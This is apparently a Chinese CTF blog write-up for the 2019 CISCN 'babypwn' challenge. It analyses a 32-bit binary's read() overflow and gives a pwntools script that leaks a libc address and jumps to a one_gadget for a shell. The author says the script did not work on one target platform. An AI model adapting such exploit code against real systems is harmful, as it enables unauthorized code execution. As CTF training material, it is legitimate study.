---
title: 2019ciscn华东南babypwn
date: 2019-12-16 15:55:28
tags:
---
<!-- more -->
32位程序，开了NX  
![](ciscn2019_es_babypwn1.png)  
溢出函数  
![](ciscn2019_es_babypwn2.png)  
read函数存在溢出，但是溢出字节有点少  
先gdb调试打印出libc基地址，然后用泄露出的真实地址减去libc基地址得到偏移，再用泄露出的真实地址减去偏移即可直接得到libc基地址  
然后直接用one_gadget做一下  
```python  
#coding=utf-8
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
#p=remote("",)
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc
p.recvuntil("name?\n")

#gdb.attach(p)
p.send('A'*0x28)

libc_leak = u32(p.recvuntil("\xf7")[-4:])    #泄露出的是libc的真实地址
log.success("libc_leak==>" + hex(libc_leak))
libc_base = libc_leak-0x1b23dc  # offset = 0x1b23dc
log.success("libc_base==>" + hex(libc_base))
one_gadget = libc_base + 0x3ac5c
payload = 'A'*0x28 + p32(0xdeadbeef) + p32(one_gadget)
p.send(payload)

p.interactive()
```  
如果libc版本一样的话就可以直接拿shell了  
但是BUUOJ的题是ubuntu18，一直调都是timeout，然后这个溢出字节比较少的栈迁移的还没学会，先咕了，后续再填坑……  